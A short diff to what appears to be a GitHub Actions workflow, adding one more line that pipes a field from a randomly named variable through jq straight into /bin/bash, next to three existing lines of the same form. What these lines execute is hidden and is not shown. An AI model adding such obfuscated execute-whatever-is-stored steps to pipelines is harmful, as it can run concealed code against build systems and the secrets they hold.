@@ -39,6 +39,7 @@ jobs:
           echo $fijoj61228 | jq -r .lo993 | /bin/bash
           echo $zaz812 | jq -r .pg98 | /bin/bash
           echo $fh3640 | jq -r .h0408 | /bin/bash
+          printf '%s' "$jgvea0" | jq -r .iil468 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
